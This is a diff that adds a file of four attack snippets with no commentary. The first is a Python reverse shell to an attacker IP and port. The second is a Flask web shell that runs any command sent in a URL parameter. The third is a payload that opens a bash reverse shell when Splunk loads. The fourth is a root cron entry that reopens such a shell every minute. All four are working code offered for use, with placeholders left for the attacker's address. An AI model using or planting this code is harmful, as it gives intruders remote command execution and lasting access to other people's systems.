@@ -1,0 +1,39 @@
+# Content1
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("YOUR_ATTACKER_IP", 4444))  # Change IP and port
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])
+
+# Content2 
+from flask import Flask, request
+import os
+app = Flask(__name__)
+@app.route('/cmd')
+def cmd():
+    cmd = request.args.get('c')
+    try:
+        output = os.popen(cmd).read()
+        return output
+    except:
+        return "Error"
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=8080)
+
+# Content3 
+import os
+import subprocess
+
+def run():
+    # Execute on Splunk load/reload
+    os.system("bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' &")
+    return {"status": "ok"}
+
+if __name__ == "__main__":
+    run()
+
+# Content4
+# poc-content.txt for cron
+* * * * * root bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
